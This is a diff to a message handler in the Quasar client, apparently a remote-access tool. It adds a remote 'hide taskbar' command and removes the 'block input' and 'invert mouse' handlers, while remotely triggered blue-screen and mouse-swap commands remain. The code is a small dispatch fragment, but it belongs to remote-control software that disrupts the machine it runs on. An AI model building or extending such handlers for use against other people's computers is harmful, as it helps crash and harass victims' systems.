@@ -9,7 +9,7 @@ namespace Quasar.Client.Messages
 
     public class FunStuffHandler : IMessageProcessor
     {
-        public bool CanExecute(IMessage message) => message is DoBSOD || message is DoSwapMouseButtons;
+        public bool CanExecute(IMessage message) => message is DoBSOD || message is DoSwapMouseButtons || message is DoHideTaskbar;
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -23,13 +23,7 @@ namespace Quasar.Client.Messages
                 case DoSwapMouseButtons msg:
                     Execute(sender, msg);
                     break;
-                case DoBlockInput msg:
-                    Execute(sender, msg);
-                    break;
                 case DoHideTaskbar msg:
-                    Execute(sender, msg);
-                    break;
-                case DoInvertMouseMovement msg:
                     Execute(sender, msg);
                     break;
             }
@@ -55,12 +49,6 @@ namespace Quasar.Client.Messages
             }
         }
 
-        private void Execute(ISender client, DoBlockInput message)
-        {
-            //client.Send(new SetStatus { Message = "Successfull Block Input" });
-            //BlockInput.DoBlockInput();
-        }
-
         private void Execute(ISender client, DoHideTaskbar message)
         {
             try
@@ -71,19 +59,6 @@ namespace Quasar.Client.Messages
             catch
             {
                 client.Send(new SetStatus { Message = "Failed to hide taskbar" });
-            }
-        }
-
-        private void Execute(ISender client, DoInvertMouseMovement message)
-        {
-            try
-            {
-                client.Send(new SetStatus { Message = "Successfull Invert Mouse Movement" });
-                InvertMouseMovement.DoInvertMouseMovement();
-            }
-            catch
-            {
-                client.Send(new SetStatus { Message = "Failed to invert mouse movement" });
             }
         }
     }
